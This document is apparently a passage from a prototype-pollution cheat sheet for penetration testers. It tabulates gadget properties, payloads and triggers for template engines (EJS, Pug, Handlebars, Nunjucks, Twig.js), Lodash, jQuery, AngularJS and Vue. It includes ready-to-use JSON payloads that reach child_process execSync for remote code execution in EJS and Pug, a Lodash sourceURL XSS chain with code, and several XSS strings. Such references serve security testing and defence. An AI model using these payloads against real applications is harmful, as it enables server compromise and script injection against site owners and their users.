# prototype-pollution-test · part 2（续）

> 接 [`prototype-pollution-test-p2.md`](prototype-pollution-test-p2.md) 的后半段（原块 >12KB 拆分）。

## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |

---
## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---
## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---
## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---
## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---
